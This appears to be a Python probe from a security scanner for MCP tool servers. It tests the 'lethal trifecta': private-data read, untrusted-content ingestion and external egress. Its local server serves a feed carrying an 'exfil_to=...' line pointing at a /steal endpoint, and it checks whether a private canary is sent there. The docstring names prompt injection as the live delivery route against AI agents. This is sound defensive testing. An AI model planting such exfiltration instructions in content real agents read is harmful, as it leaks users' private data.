"""T12.3 / SAM1-23 — lethal-trifecta chain probe (oracle-gated).

Private-data read + untrusted-content ingestion + external egress, reachable via ONE untrusted-input
path. Ground truth (deterministic, NO LLM): the scanner stands up its own collector that serves the
untrusted feed (naming an egress dest) AND records egress. CONFIRMED iff the PRIVATE canary
TRIFECTA-<tok> reaches the collector's /steal path via a single aggregate() call driven by that feed.

Honest wording (REQUIRED): CONFIRMED = "untrusted-input-controlled exfiltration of private data via a
single tool call (deterministic data-flow proof)." In a live agent the untrusted content drives this
via PROMPT INJECTION — the realistic delivery vector — but that step is NOT demonstrated here; we prove
the data-flow chain deterministically, without any model in the loop.
"""
from __future__ import annotations

import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

from mcp_rt.mcp_client import StatelessHTTPClient

_CONFIRMED_LABEL = ("untrusted-input-controlled exfiltration of private data via a single tool call "
                    "(deterministic data-flow proof)")
_CONTEXT_NOTE = ("in a live agent the untrusted content drives this via prompt injection (the realistic "
                 "delivery vector) — NOT demonstrated here; the data-flow chain is proven deterministically, "
                 "no LLM in the loop")


def _meta(verdict, **kw):
    return {"case": "lethal_trifecta", "verdict": verdict, "owasp_family": "lethal-trifecta",
            "cwe": "CWE-200 (private-data exfiltration via the trifecta chain)",
            "confirmed_label": _CONFIRMED_LABEL, "context_note": _CONTEXT_NOTE, **kw}


def probe_trifecta(url: str, tok: str, malicious_feed: bool = True) -> dict:
    hits: list[str] = []
    holder: dict = {}

    class _Collab(BaseHTTPRequestHandler):            # scanner's own server: serves the feed + records egress
        def log_message(self, *a):
            pass

        def do_GET(self):
            if self.path.startswith("/feed"):
                feed = "headline: daily news digest\n"
                if malicious_feed:                    # untrusted content names an egress destination
                    feed += f"exfil_to=http://127.0.0.1:{holder['port']}/steal\n"
                body = feed.encode()
                self.send_response(200); self.send_header("Content-Length", str(len(body)))
                self.end_headers(); self.wfile.write(body)
            else:                                     # /steal?data=... (or anything else) -> record it
                hits.append(self.path)
                self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers()
                self.wfile.write(b"ok")

    collab = HTTPServer(("127.0.0.1", 0), _Collab)
    holder["port"] = collab.server_address[1]
    threading.Thread(target=collab.serve_forever, daemon=True).start()
    try:
        feed_url = f"http://127.0.0.1:{holder['port']}/feed"
        tools = [t["name"] for t in StatelessHTTPClient(url).list_tools()]
        if "aggregate" not in tools:                  # no single call chains the three -> LEAD or BOUNDED
            has_three = {"read_private", "fetch_feed", "send_external"} <= set(tools)
            return _meta("LEAD" if has_three else "BOUNDED",
                         note=("all three capabilities present as separate tools but no single call "
                               "chains them -> capabilities-present, chain not demonstrated"))
        StatelessHTTPClient(url).begin("tools/call", {"name": "aggregate", "arguments": {"source_url": feed_url}})
        steal_hit = any(h.startswith("/steal") for h in hits)                 # did ANY egress reach the dest
        exfiltrated = any(h.startswith("/steal") and f"TRIFECTA-{tok}" in h for h in hits)  # the PRIVATE canary
        return _meta("CONFIRMED" if exfiltrated else "BOUNDED",
                     exfiltrated=exfiltrated, steal_hit=steal_hit,
                     note=("private canary egressed to the untrusted-named dest" if exfiltrated
                           else "private canary did NOT reach the untrusted-controlled dest"))
    finally:
        collab.shutdown()
